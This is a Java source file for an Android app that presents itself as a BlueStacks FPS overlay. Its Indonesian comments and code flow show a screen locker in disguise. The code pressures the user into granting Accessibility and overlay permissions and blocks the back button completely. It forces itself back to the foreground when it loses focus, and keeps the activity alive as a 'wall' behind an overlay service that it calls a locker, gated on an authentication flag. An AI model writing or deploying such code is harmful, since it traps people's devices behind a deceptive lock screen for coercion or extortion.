package com.bluestacks.fpsoverlay;

import android.app.Activity;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityManager;
import java.util.List;

public class MainActivity extends Activity {

    private static final int ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE = 5469;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Hilangkan animasi masuk agar tidak flicker
        overridePendingTransition(0, 0);

        // 1. Cek Accessibility dulu. Ini prioritas utama.
        if (!isAccessibilityEnabled()) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
            return;
        }

        // 2. Jika Accessibility sudah aktif, minta izin Overlay
        checkPermission();
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        
        // Jika dipanggil ulang saat sudah aktif, cek lagi izinnya
        if (Settings.canDrawOverlays(this)) {
            startOverlay();
        }
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        // Tarik kembali jika Accessibility dan Overlay sudah aktif
        if (!hasFocus && isAccessibilityEnabled() && Settings.canDrawOverlays(this)) {
            startOverlay();
        }
    }

    @Override
    public void onBackPressed() {
        // Blokir tombol back total
        return;
    }

    public void checkPermission() {
        if (!Settings.canDrawOverlays(this)) {
            // Jika izin belum diberikan, buka pengaturan sistem
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
            startActivityForResult(intent, ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE);
        } else {
            // Jika sudah ada izin, jalankan FPSService
            startOverlay();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE) {
            // Setelah kembali dari Overlay, baru nyalakan loker
            if (Settings.canDrawOverlays(this)) {
                startOverlay();
            }
        }
    }

    private boolean isAccessibilityEnabled() {
        AccessibilityManager am = (AccessibilityManager) getSystemService(Context.ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
        
        for (AccessibilityServiceInfo enabledService : enabledServices) {
            ServiceInfo enabledServiceInfo = enabledService.getResolveInfo().serviceInfo;
            if (enabledServiceInfo.packageName.equals(getPackageName()) && 
                enabledServiceInfo.name.equals(FPSAccessibilityService.class.getName())) {
                return true;
            }
        }
        return false;
    }

    private void startOverlay() {
        if (FPSService.isAuthenticated) {
            return;
        }
        // Memulai service FPS Overlay
        Intent intent = new Intent(MainActivity.this, FPSService.class);
        startService(intent);
        
        // Jangan panggil finish()! Biarkan dia jadi tembok di belakang overlay
        overridePendingTransition(0, 0);
    }
}